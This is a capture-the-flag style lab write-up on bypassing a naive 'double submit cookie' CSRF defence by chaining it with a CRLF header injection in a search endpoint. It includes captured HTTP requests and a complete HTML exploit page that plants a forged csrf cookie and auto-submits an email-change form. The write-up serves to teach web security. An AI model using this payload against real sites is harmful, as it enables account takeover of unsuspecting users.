# CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`.

---

## 1. Setup

- Accessed the lab, clicked `My Account`, and logged in using `wiener:peter`.
- Landed on `/my-account?id=wiener`, which has a functionality to update the account's email.

---

## 2. Analysing the Email Change Request

- Used the change email functionality and captured the request in BurpSuite:

```http
POST /my-account/change-email HTTP/2
Host: 0a3e008c037f0c20805d802d00bd0025.web-security-academy.net
Cookie: csrf=7TRANR0Gc8ZWllxyGsUBmqcLZwRNeLYD; session=oUta5NnAwnURkNmDQHLKtngjy74zEGi7
Content-Length: 59
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a3e008c037f0c20805d802d00bd0025.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e008c037f0c20805d802d00bd0025.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

email=test%40test.com&csrf=7TRANR0Gc8ZWllxyGsUBmqcLZwRNeLYD
```

- Noticed two interesting things:
  - A `csrf` parameter in the POST body (as usual).
  - A `csrf` cookie in the `Cookie` header, holding the **exact same value** as the body parameter.

---

## 3. Probing the Token Validation

- Removed the `csrf` parameter entirely, and separately tried mismatching the `csrf` cookie and body parameter values. Both attempts returned:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"
```

- This suggested the server checks that the cookie and body parameter are present *and* match each other — the classic "double submit cookie" pattern.
- The key question: does the server actually validate the token against anything server-side (like the session), or does it just compare the cookie value to the body value?
- Tested this by setting **both** the `csrf` cookie and the `csrf` body parameter to an arbitrary value, `1`:

```http
POST /my-account/change-email HTTP/2
Host: 0a3e008c037f0c20805d802d00bd0025.web-security-academy.net
Cookie: csrf=1; session=oUta5NnAwnURkNmDQHLKtngjy74zEGi7
Content-Length: 28
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a3e008c037f0c20805d802d00bd0025.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e008c037f0c20805d802d00bd0025.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

email=test%40test.com&csrf=1
```

- Got back a successful response:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

- This confirmed the server **does not validate the token's authenticity at all** — it only checks that the cookie value and body parameter value are equal to each other. The backend pseudo code likely looks something like:

```javascript
const { email, csrf } = request.body;
const csrfCookie = request.cookies.csrf;

if (!email || !csrf || !csrfCookie) {
    return res.status(400).json({ message: "Invalid CSRF token" });
}

if (csrf !== csrfCookie) {
    return res.status(400).json({ message: "Invalid CSRF token" });
}

// No check against the session or any server-side stored value —
// as long as cookie === body parameter, the request is trusted.
updateEmail(request.session.user, email);
return res.redirect("/my-account?id=" + request.session.user);
```

- This is the classic flaw in a naive "double submit cookie" implementation: it prevents an attacker from *guessing* a valid token, but it does nothing to stop an attacker who can **set their own cookie** in the victim's browser, since the attacker can just make the cookie and the form value match each other.

---

## 4. Reusing the CRLF Injection

- As found in a previous lab, the search functionality reflects user input directly into a `Set-Cookie` response header:

```
GET /?search=hello%0d%0aX-Header:+true
```

```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=hello
X-Header: true; Secure; HttpOnly
```

- This CRLF injection can be used to plant an arbitrary `Set-Cookie` header in the victim's browser — including a `csrf` cookie of the attacker's choosing.
- Combined with the flaw above, this is a perfect match: if the attacker can set `csrf=1` as a cookie in the victim's browser via CRLF injection, and also submit `csrf=1` as the form's body parameter, the two values will match and the server will accept the request — regardless of the victim's actual session.

---

## 5. Chaining CRLF + CSRF

- The attack plan: use the CRLF injection to plant a `csrf=1` cookie into the victim's browser via a forged `Set-Cookie` header, then auto-submit the email change form with `csrf=1` in the body. Since the server only checks that the cookie matches the body parameter (not that either is a legitimate, session-bound token), this gives full CSRF control.
- Crafted the final exploit payload:

```html
<html>
   <form enctype="application/x-www-form-urlencoded" action="https://0a3e008c037f0c20805d802d00bd0025.web-security-academy.net/my-account/change-email" method="POST">
      <table>
         <tr>
            <td>email</td>
            <td><input type="text" value="attacker@attacker.com" name="email"></td>
         </tr>
         <tr>
            <td>csrf</td>
            <td><input type="text" value="1" name="csrf"></td>
         </tr>
      </table>
   </form>
   <img src="https://0a3e008c037f0c20805d802d00bd0025.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=1%3b%20SameSite=None" onerror="document.forms[0].submit()">
</html>
```

- Breaking down what happens when the victim loads this page:
  1. The browser requests the `<img>` src — a search request to the lab with a CRLF-injected `Set-Cookie` header that plants `csrf=1` into the victim's browser with `SameSite=None`.
  2. The image fails to load (it's not an actual image), triggering the `onerror` handler.
  3. `onerror` fires `document.forms[0].submit()`, which POSTs the email change form with `csrf=1` in the body.
  4. The server now receives a request where the `csrf` cookie equals the `csrf` body parameter — exactly as it expects — and processes the email change.

> **Why this works:** The server's "double submit cookie" check only verifies that the `csrf` cookie and the `csrf` body parameter are equal to each other; it never validates that the value is a legitimate, unguessable, session-bound token. An attacker who can inject a `Set-Cookie` header into the victim's browser (via the CRLF vulnerability in the search endpoint) can plant any value they like as the `csrf` cookie, then supply that same value in the forged form body — making the equality check pass trivially, all without ever touching the victim's real session or needing to know a valid token.

---

## 6. Solve the Challenge

- Hosted the payload on the exploit server and delivered it to the victim.
- The CRLF injection planted `csrf=1` into the victim's browser; the form auto-submitted with the matching `csrf=1` body parameter; the server accepted the request and changed the victim's email to `attacker@attacker.com`.
- Lab solved.